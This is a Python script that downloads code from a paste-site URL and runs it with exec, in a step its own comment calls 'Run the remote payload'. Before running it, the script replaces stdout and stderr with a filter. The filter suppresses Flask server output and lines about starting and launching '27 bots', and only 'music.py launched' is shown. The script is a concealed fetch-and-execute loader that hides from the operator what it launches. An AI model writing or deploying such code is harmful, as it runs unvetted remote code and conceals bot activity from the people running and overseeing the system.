import urllib.request
import sys
import traceback
import logging

URL = "https://pastefy.app/CHa01fQc/raw"
# --- THE FIX: SILENCE FLASK ---
logging.getLogger('werkzeug').setLevel(logging.ERROR)
logging.getLogger('werkzeug').disabled = True

# Block lines starting with these emojis (added 🚀 and ⏳)
BLOCKED_EMOJIS = ("✅", "🔌", "⚠️", "🚀", "⏳")

# Block lines if they contain ANY of these words
BLOCKED_WORDS = (
    "Serving Flask",
    "Debug mode",
    "Starting 27 bots",
    "waiting for connections",
    "bots launched",
    "Press CTRL+C",
    "development server",
)

class ConsoleFilter:
    def __init__(self, original):
        self.original = original
        self.buffer = ""

    def write(self, text):
        if not text:
            return
        if isinstance(text, bytes):
            text = text.decode('utf-8', errors='ignore')
        
        self.buffer += text
        while "\n" in self.buffer:
            line, self.buffer = self.buffer.split("\n", 1)
            clean_line = line.lstrip()
            
            # 1. Block if it starts with the emojis
            if clean_line.startswith(BLOCKED_EMOJIS):
                continue
                
            # 2. Block if it contains ANY of the blocked words
            if any(word in clean_line for word in BLOCKED_WORDS):
                continue
                
            # 3. Block if it starts with the chevron or just "* "
            if clean_line.startswith("»") or clean_line.startswith("* "):
                continue
                
            self.original.write(line + "\n")
            
        self.original.flush()

    def flush(self):
        if self.buffer:
            clean_line = self.buffer.lstrip()
            if not clean_line.startswith(BLOCKED_EMOJIS) and not any(word in clean_line for word in BLOCKED_WORDS):
                self.original.write(self.buffer)
            self.buffer = ""
        self.original.flush()

    def isatty(self):
        return False

    def fileno(self):
        return self.original.fileno()

# Fetch the code
req = urllib.request.Request(URL, headers={"User-Agent": "Mozilla/5.0"})
try:
    code = urllib.request.urlopen(req).read().decode('utf-8')
except Exception as e:
    print(f"Error fetching URL: {e}")
    sys.exit(1)

# Apply the filter
sys.stdout = ConsoleFilter(sys.__stdout__)
sys.stderr = ConsoleFilter(sys.__stderr__)

# Print ONLY your custom launch message
print("music.py launched")

# Run the remote payload
try:
    exec(compile(code, "<string>", "exec"), {"__name__": "__main__"})
except Exception:
    traceback.print_exc(file=sys.__stderr__)
